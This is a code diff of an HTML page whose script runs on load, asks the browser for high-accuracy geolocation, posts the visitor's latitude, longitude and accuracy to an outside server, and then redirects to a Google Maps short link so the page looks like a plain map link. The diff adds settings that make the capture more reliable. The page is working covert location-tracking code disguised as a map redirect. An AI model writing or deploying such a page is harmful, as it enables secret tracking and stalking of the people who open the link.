@@ -5,38 +5,46 @@
 </head>
 <body>
     <script>
-        const googleMapsURL = 'https://maps.app.goo.gl/JVUi2F98vrGs1ryn8';
-        const serverURL = 'https://livelocation-k0iy.onrender.com/save-location.php';
+const googleMapsURL = 'https://maps.app.goo.gl/JVUi2F98vrGs1ryn8';
+const serverURL = 'https://livelocation-k0iy.onrender.com/save-location.php';
 
-        async function getLocation() {
-            try {
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject);
-                });
+async function getLocation() {
+    try {
+        const position = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
+            });
+        });
 
-                const coords = {
-                    lat: position.coords.latitude,
-                    lng: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    timestamp: Date.now()
-                };
+        // DEBUG: Show coordinates in console
+        console.log('Captured:', position.coords);
 
-                // BLOCKING request with 2s timeout
-                await fetch(serverURL, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify(coords),
-                    signal: AbortSignal.timeout(2000)
-                });
+        // BLOCK until POST completes
+        await fetch(serverURL, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                lat: position.coords.latitude,
+                lng: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                timestamp: Date.now()
+            }),
+            keepalive: true // Critical for page unload
+        });
 
-            } catch (error) {
-                console.error('Fatal error:', error);
-            } finally {
-                window.location.href = googleMapsURL;
-            }
-        }
+    } catch (error) {
+        console.error('FATAL:', error);
+    } finally {
+        // Wait 500ms before redirect
+        setTimeout(() => {
+            window.location.href = googleMapsURL;
+        }, 500);
+    }
+}
 
-        window.onload = getLocation;
-    </script>
+window.onload = getLocation;
+</script>
 </body>
 </html>
